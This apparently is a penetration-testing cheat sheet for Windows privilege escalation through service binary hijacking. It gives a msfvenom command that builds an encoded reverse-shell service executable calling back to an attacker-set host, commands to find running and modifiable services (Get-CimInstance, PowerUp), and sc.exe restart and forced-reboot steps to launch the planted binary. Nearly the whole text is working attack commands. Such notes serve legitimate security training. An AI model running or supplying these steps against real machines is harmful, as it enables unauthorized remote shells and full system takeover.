
MSFVenom payload:
```
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f exe-service -o winshell.exe LHOST=IP LPORT=PORT
```

Finding a service:
```
// Important: only works in "interactive situations". If it throws an error, it's not interactive. Then, use Winpeas.exe --> "Services Information", always works.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
// OR
. .\PowerUp.ps1
Get-ModifiableServiceFile                  // might not always work
```

If there is a vulnerable service (overwritable binary), replace the binary.
To start/reboot the service:

```
sc.exe stop ServiceName
sc.exe start ServiceName
```
If this gets denied, check if reboot privileges are enabled:
```
whoami /priv
shutdown /r /t 0
```

